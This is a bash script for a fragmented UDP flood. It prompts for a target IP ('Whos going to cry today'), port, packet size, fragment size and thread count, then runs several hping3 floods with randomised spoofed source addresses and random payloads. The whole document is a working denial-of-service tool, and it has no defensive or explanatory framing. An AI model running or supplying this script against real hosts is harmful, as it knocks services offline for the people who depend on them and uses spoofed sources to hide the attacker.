#! /bin/bash

echo "###################### Fragmentation Random Payload - UDP PAYLOAD ######################"
echo -en "Whos going to cry today (IP):"
read tarip
echo -en ENTER PORT NUMBER:
read port
echo -en ENTER Packet Size:
read packet
echo -en ENTER Frag Size:
read frag
echo -en ENTER NUMBER OF HPING THREADS:
read count
echo "################# STARTING THREADS #################################################################"
#packet=$1
#port=$2
#count=$3

cd /usr/bin
for i in `seq 1 $count`;
do
python -c "import random, sys;
sys.stdout.write(''.join(['\\\x{0:02x}'.format(random.randint(0,255)) for _ in xrange(1000)]))" > udp_frag_payload$i
hping3 $tarip --udp -p $port --flood -I eth1 --rand-source -x -g $frag -d $packet -E udp_frag_payload$i &
done
